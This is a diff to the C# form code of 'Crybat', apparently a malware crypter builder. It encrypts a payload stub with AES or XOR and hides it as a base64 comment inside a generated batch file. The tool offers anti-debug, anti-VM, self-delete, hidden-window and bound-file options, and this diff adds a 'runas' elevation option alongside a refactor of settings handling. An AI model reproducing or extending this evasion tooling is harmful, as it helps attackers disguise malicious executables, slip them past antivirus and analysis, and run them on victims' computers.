@@ -21,38 +21,18 @@ namespace Crybat
             InitializeComponent();
         }
 
+        // Event handlers
         private void Form1_Load(object sender, EventArgs e)
         {
             SettingsObject obj = Settings.Load();
-            if (obj != null)
-            {
-                textBox1.Text = obj.inputFile;
-                antiDebug.Checked = obj.antiDebug;
-                antiVM.Checked = obj.antiVM;
-                selfDelete.Checked = obj.selfDelete;
-                hidden.Checked = obj.hidden;
-                aesEncryption.Checked = obj.aes;
-                xorEncryption.Checked = obj.xor;
-                listBox1.Items.AddRange(obj.bindedFiles);
-            }
-            Task.Factory.StartNew(CheckVersion); // Comment out this line to disable version checking
+            if (obj != null) UnpackSettings(obj);
+            Task.Factory.StartNew(CheckVersion);
             UpdateKeys(sender, e);
         }
 
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
-            SettingsObject obj = new SettingsObject();
-            obj.inputFile = textBox1.Text;
-            obj.antiDebug = antiDebug.Checked;
-            obj.antiVM = antiVM.Checked;
-            obj.selfDelete = selfDelete.Checked;
-            obj.hidden = hidden.Checked;
-            obj.aes = aesEncryption.Checked;
-            obj.xor = xorEncryption.Checked;
-            List<string> paths = new List<string>();
-            foreach (string item in listBox1.Items) paths.Add(item);
-            obj.bindedFiles = paths.ToArray();
-            Settings.Save(obj);
+            Settings.Save(PackSettings());
             Environment.Exit(0);
         }
 
@@ -64,10 +44,7 @@ namespace Crybat
             textBox1.Text = ofd.FileName;
         }
 
-        private void buildButton_Click(object sender, EventArgs e)
-        {
-            Crypt();
-        }
+        private void buildButton_Click(object sender, EventArgs e) => Crypt();
 
         private void aesEncryption_CheckedChanged(object sender, EventArgs e)
         {
@@ -92,6 +69,7 @@ namespace Crybat
             listBox1.Items.Remove(listBox1.SelectedItem);
         }
 
+        // Functions
         private void Crypt()
         {
             buildButton.Enabled = false;
@@ -174,7 +152,7 @@ namespace Crybat
             byte[] stub_enc = Encrypt(mode, Compress(stubbytes), _key, _iv);
 
             listBox2.Items.Add("Creating batch file...");
-            string content = FileGen.CreateBat(_key, _iv, mode, hidden.Checked, selfDelete.Checked, rng);
+            string content = FileGen.CreateBat(_key, _iv, mode, hidden.Checked, selfDelete.Checked, runas.Checked, rng);
             List<string> content_lines = new List<string>(content.Split(new string[] { Environment.NewLine }, StringSplitOptions.None));
             content_lines.Insert(rng.Next(0, content_lines.Count), ":: " + Convert.ToBase64String(stub_enc));
             content = string.Join(Environment.NewLine, content_lines);
@@ -231,6 +209,38 @@ namespace Crybat
             key2.Text = Convert.ToBase64String(aes.Key);
             iv6.Text = Convert.ToBase64String(aes.IV);
             aes.Dispose();
+        }
+
+        private void UnpackSettings(SettingsObject obj)
+        {
+            textBox1.Text = obj.inputFile;
+            antiDebug.Checked = obj.antiDebug;
+            antiVM.Checked = obj.antiVM;
+            selfDelete.Checked = obj.selfDelete;
+            hidden.Checked = obj.hidden;
+            runas.Checked = obj.runas;
+            aesEncryption.Checked = obj.aes;
+            xorEncryption.Checked = obj.xor;
+            listBox1.Items.AddRange(obj.bindedFiles);
+        }
+
+        private SettingsObject PackSettings()
+        {
+            SettingsObject obj = new SettingsObject()
+            {
+                inputFile = textBox1.Text,
+                antiDebug = antiDebug.Checked,
+                antiVM = antiVM.Checked,
+                selfDelete = selfDelete.Checked,
+                hidden = hidden.Checked,
+                runas = runas.Checked,
+                aes = aesEncryption.Checked,
+                xor = xorEncryption.Checked
+            };
+            List<string> paths = new List<string>();
+            foreach (string item in listBox1.Items) paths.Add(item);
+            obj.bindedFiles = paths.ToArray();
+            return obj;
         }
     }
 }
